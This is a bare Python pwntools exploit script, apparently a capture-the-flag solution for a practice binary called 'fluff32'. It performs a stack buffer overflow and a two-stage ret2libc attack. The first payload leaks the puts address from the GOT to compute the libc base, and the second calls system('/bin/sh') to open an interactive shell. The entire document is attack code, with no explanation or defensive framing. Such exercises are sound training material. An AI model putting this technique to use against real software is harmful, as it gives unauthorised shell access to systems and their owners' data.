from pwn import *
target=process('./fluff32')
elf=ELF('./fluff32')
libc=elf.libc

print(target.recvuntil("...\n> "))
payload="A"*44

popret=0x080483e1
puts_plt=0x08048420
puts_got=0x0804a014
pwnme=0x080485f6

payload+=p32(puts_plt)
payload+=p32(popret)
payload+=p32(puts_got)
payload+=p32(pwnme)
payload+=p32(0x0)

target.sendline(payload)

leak=target.recv()[0:4]
libc_puts=u32(leak)
libc_base=libc_puts-libc.symbols["puts"]
print(hex(libc_base))
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()

payload="A"*44
payload+=p32(libc_system)
payload+=p32(0xdeadbeef)
payload+=p32(libc_binsh)
payload+=p32(0x0)

target.sendline(payload)
target.interactive()
